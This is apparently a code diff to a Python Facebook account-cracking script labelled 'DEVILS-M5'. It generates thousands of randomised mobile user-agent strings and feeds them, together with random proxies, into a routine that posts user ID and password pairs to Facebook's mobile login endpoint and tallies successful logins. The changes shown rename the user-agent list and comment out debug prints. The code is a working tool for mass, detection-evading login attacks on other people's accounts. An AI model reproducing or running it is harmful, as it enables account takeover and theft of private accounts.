@@ -227,7 +227,7 @@ saved = []
 totaldmp = 0
 filter = []
 ugen = []
-ugen66 = []
+ugen7 = []
 
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android'
@@ -243,7 +243,7 @@ for agent in range(10000):
         k=random.randrange(40,150)
         l='Mobile Safari/537.36'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
+        ugen7.append(fullagnt)
 
 fbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
 AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
@@ -260,7 +260,7 @@ for xd in range(10000):
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
     uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
+    ugen7.append(uaku2)
 
 for x in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
@@ -276,7 +276,7 @@ for x in range(10000):
     k=random.randrange(40,150)
     l='Mobile Safari/537.36'
     uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku)
+    ugen7.append(uaku)
 
 for x in range(10000):
     aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
@@ -292,7 +292,7 @@ for x in range(10000):
     k=random.randrange(40,150)
     l='Mobile/15E148 Safari/604.'
     uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
+    ugen7.append(uaku2)
 
 mggg="""Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36
 Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1
@@ -2652,7 +2652,7 @@ def ram568(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M5\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
             sys.stdout.flush()
-            ua = random.choice(ugen)
+            ua = random.choice(ugen7)
             nip=random.choice(prox)
             ucv="61555236722562"
             vxdg="uzzal@@##143"
@@ -2687,8 +2687,8 @@ def ram568(uid,pwx,tl):
             'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
             "sec-ch-prefers-color-scheme": "light",
             'user-agent': ua}
-            #print(log_data)
-            #print(header_freefb)
+            ##print(log_data)
+            ##print(header_freefb)
             lo = session.post('https://iphone.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
